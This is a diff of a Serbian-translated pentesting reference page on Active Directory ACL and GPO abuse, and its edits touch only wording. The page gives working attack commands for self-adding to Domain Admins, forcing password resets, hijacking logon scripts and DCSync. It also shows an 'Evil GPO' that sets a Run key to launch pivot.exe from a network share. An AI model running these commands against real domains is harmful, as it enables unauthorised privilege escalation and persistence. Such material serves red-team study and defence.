@@ -6,6 +6,7 @@
 
 ## BadSuccessor
 
+
 {{#ref}}
 BadSuccessor.md
 {{#endref}}
@@ -27,7 +28,7 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 ## **GenericAll prava na grupi**
 
-Ova privilegija omogućava napadaču da manipuliše članstvom u grupama ako imaju `GenericAll` prava na grupi kao što je `Domain Admins`. Nakon identifikacije imena grupe pomoću `Get-NetGroup`, napadač može:
+Ova privilegija omogućava napadaču da manipuliše članstvima u grupama ako imaju `GenericAll` prava na grupi kao što je `Domain Admins`. Nakon identifikacije imena grupe pomoću `Get-NetGroup`, napadač može:
 
 - **Dodati sebe u grupu Domain Admins**: Ovo se može uraditi putem direktnih komandi ili korišćenjem modula kao što su Active Directory ili PowerSploit.
 ```bash
@@ -44,7 +45,7 @@ Držanje ovih privilegija na objektu računara ili korisničkom nalogu omogućav
 
 ## **WriteProperty on Group**
 
-Ako korisnik ima `WriteProperty` prava na sve objekte za određenu grupu (npr., `Domain Admins`), može:
+Ako korisnik ima `WriteProperty` prava na svim objektima za određenu grupu (npr., `Domain Admins`), može:
 
 - **Dodati Sebe u Grupu Domain Admins**: Ova metoda, koja se može postići kombinovanjem `net user` i `Add-NetGroupUser` komandi, omogućava eskalaciju privilegija unutar domena.
 ```bash
@@ -52,20 +53,20 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 ## **Self (Self-Membership) on Group**
 
-Ova privilegija omogućava napadačima da se dodaju u određene grupe, kao što su `Domain Admins`, putem komandi koje direktno manipulišu članstvom u grupi. Korišćenje sledeće sekvence komandi omogućava samododavanje:
+Ova privilegija omogućava napadačima da se dodaju u specifične grupe, kao što su `Domain Admins`, putem komandi koje direktno manipulišu članstvom u grupi. Korišćenje sledeće sekvence komandi omogućava samododavanje:
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **WriteProperty (Self-Membership)**
 
-Slična privilegija, ovo omogućava napadačima da se direktno dodaju u grupe modifikovanjem svojstava grupa ako imaju pravo `WriteProperty` na tim grupama. Potvrda i izvršenje ove privilegije se vrši sa:
+Slična privilegija, ovo omogućava napadačima da se direktno dodaju u grupe modifikovanjem svojstava grupa ako imaju `WriteProperty` pravo na tim grupama. Potvrda i izvršenje ove privilegije se vrše sa:
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-Držanje `ExtendedRight` na korisniku za `User-Force-Change-Password` omogućava resetovanje lozinki bez poznavanja trenutne lozinke. Verifikacija ovog prava i njegova eksploatacija mogu se izvršiti putem PowerShell-a ili alternativnih komandnih alata, nudeći nekoliko metoda za resetovanje lozinke korisnika, uključujući interaktivne sesije i jednostavne komande za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linux-u, pokazujući svestranost napadačkih vektora.
+Držanje `ExtendedRight` na korisniku za `User-Force-Change-Password` omogućava resetovanje lozinki bez poznavanja trenutne lozinke. Verifikacija ovog prava i njegova eksploatacija mogu se izvršiti putem PowerShell-a ili alternativnih komandnih alata, nudeći nekoliko metoda za resetovanje lozinke korisnika, uključujući interaktivne sesije i jednostavne komande za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linux-u, pokazujući svestranost vektora napada.
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -84,7 +85,7 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=o
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
-## **GenericWrite na korisniku**
+## **GenericWrite na Korisniku**
 
 Ova dozvola omogućava napadaču da menja svojstva korisnika. Konkretno, sa `GenericWrite` pristupom, napadač može promeniti putanju skripte za prijavljivanje korisnika kako bi izvršio zloćudnu skriptu prilikom prijavljivanja korisnika. To se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljanog korisnika da upućuje na napadačevu skriptu.
 ```bash
@@ -118,19 +119,19 @@ DCSync napad koristi specifične dozvole replikacije na domenu da oponaša Kontr
 
 ### GPO Delegacija
 
-Delegirani pristup za upravljanje Grupnim Politicama (GPO) može predstavljati značajne bezbednosne rizike. Na primer, ako je korisniku kao što je `offense\spotless` dodeljeno pravo upravljanja GPO-om, mogu imati privilegije kao što su **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole se mogu zloupotrebiti u zle svrhe, kako je identifikovano korišćenjem PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Delegirani pristup za upravljanje Grupnim Politicama (GPO) može predstavljati značajne bezbednosne rizike. Na primer, ako je korisniku kao što je `offense\spotless` dodeljeno pravo upravljanja GPO-ima, mogu imati privilegije kao što su **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole se mogu zloupotrebiti u zle svrhe, kako je identifikovano korišćenjem PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-### Nabrajanje GPO Dozvola
+### Enumeracija GPO Dozvola
 
 Da bi se identifikovali pogrešno konfigurisani GPO-ovi, PowerSploit-ove cmdlet komande mogu se povezati. Ovo omogućava otkrivanje GPO-ova kojima određeni korisnik ima dozvole za upravljanje: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Računari sa Primijenjenom Politikom**: Moguće je utvrditi na koje računare se određeni GPO primenjuje, što pomaže u razumevanju opsega potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Računari sa Primijenjenom Politikom**: Moguće je utvrditi na koje računare se određeni GPO primenjuje, što pomaže u razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
 **Politike Primijenjene na Određeni Računar**: Da biste videli koje politike su primenjene na određeni računar, mogu se koristiti komande kao što je `Get-DomainGPO`.
 
 **OU-ovi sa Primijenjenom Politikom**: Identifikacija organizacionih jedinica (OU) koje su pogođene određenom politikom može se izvršiti korišćenjem `Get-DomainOU`.
 
-Takođe možete koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za nabrajanje GPO-ova i pronalaženje problema u njima.
+Takođe možete koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za enumeraciju GPO-ova i pronalaženje problema u njima.
 
 ### Zloupotreba GPO - New-GPOImmediateTask
 
@@ -145,7 +146,7 @@ GroupPolicy modul, ako je instaliran, omogućava kreiranje i povezivanje novih G
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-### SharpGPOAbuse - Abuse GPO
+### SharpGPOAbuse - Zloupotreba GPO
 
 SharpGPOAbuse nudi metodu za zloupotrebu postojećih GPO-ova dodavanjem zadataka ili modifikovanjem podešavanja bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva modifikaciju postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene izmena:
 ```bash
@@ -153,19 +154,19 @@ SharpGPOAbuse nudi metodu za zloupotrebu postojećih GPO-ova dodavanjem zadataka
 ```
 ### Prisilna ažuriranja politika
 
-GPO ažuriranja se obično dešavaju svakih 90 minuta. Da bi se ubrzao ovaj proces, posebno nakon implementacije promene, može se koristiti komanda `gpupdate /force` na ciljanom računaru da bi se prisililo trenutno ažuriranje politike. Ova komanda osigurava da se sve izmene GPO-a primene bez čekanja na sledeći automatski ciklus ažuriranja.
+GPO ažuriranja obično se dešavaju svakih 90 minuta. Da bi se ubrzao ovaj proces, posebno nakon implementacije promene, može se koristiti komanda `gpupdate /force` na ciljanom računaru kako bi se prisililo trenutno ažuriranje politike. Ova komanda osigurava da se sve izmene GPO-a primene bez čekanja na sledeći automatski ciklus ažuriranja.
 
-### Iza scene
+### Iza kulisa
 
 Prilikom inspekcije Zakazanih zadataka za dati GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka kao što je `evilTask`. Ovi zadaci se kreiraju putem skripti ili alata komandne linije sa ciljem modifikacije ponašanja sistema ili eskalacije privilegija.
 
-Struktura zadatka, kako je prikazano u XML konfiguracionom fajlu generisanom od `New-GPOImmediateTask`, opisuje specifičnosti zakazanog zadatka - uključujući komandu koja treba da se izvrši i njene okidače. Ovaj fajl predstavlja način na koji se zakazani zadaci definišu i upravljaju unutar GPO-a, pružajući metodu za izvršavanje proizvoljnih komandi ili skripti kao deo sprovođenja politika.
+Struktura zadatka, kako je prikazano u XML konfiguracionom fajlu generisanom od `New-GPOImmediateTask`, opisuje specifičnosti zakazanog zadatka - uključujući komandu koja treba da se izvrši i njene okidače. Ovaj fajl predstavlja način na koji se zakazani zadaci definišu i upravljaju unutar GPO-a, pružajući metodu za izvršavanje proizvoljnih komandi ili skripti kao deo sprovođenja politike.
 
 ### Korisnici i grupe
 
-GPO-i takođe omogućavaju manipulaciju članstvima korisnika i grupa na ciljnim sistemima. Uređivanjem fajlova politika Korisnika i Grupa direktno, napadači mogu dodavati korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. Ovo je moguće kroz delegaciju dozvola za upravljanje GPO-ima, što omogućava modifikaciju fajlova politika da uključuju nove korisnike ili menjaju članstva grupa.
+GPO-ovi takođe omogućavaju manipulaciju članstvima korisnika i grupa na ciljnim sistemima. Uređivanjem fajlova politika za Korisnike i Grupe direktno, napadači mogu dodavati korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. Ovo je moguće kroz delegaciju dozvola za upravljanje GPO-om, što omogućava modifikaciju fajlova politika da uključuju nove korisnike ili menjaju članstva grupa.
 
-XML konfiguracioni fajl za Korisnike i Grupe opisuje kako se ove promene implementiraju. Dodavanjem unosa u ovaj fajl, određenim korisnicima mogu se dodeliti povišene privilegije na pogođenim sistemima. Ova metoda nudi direktan pristup eskalaciji privilegija kroz manipulaciju GPO-ima.
+XML konfiguracioni fajl za Korisnike i Grupe opisuje kako se ove promene implementiraju. Dodavanjem unosa u ovaj fajl, određenim korisnicima mogu se dodeliti povišene privilegije na pogođenim sistemima. Ova metoda nudi direktan pristup eskalaciji privilegija kroz manipulaciju GPO-om.
 
 Pored toga, dodatne metode za izvršavanje koda ili održavanje postojanosti, kao što su korišćenje skripti za prijavljivanje/odjavljivanje, modifikacija registarskih ključeva za automatsko pokretanje, instalacija softvera putem .msi fajlova ili uređivanje konfiguracija servisa, takođe se mogu razmotriti. Ove tehnike pružaju različite puteve za održavanje pristupa i kontrolu ciljanih sistema kroz zloupotrebu GPO-a.
 
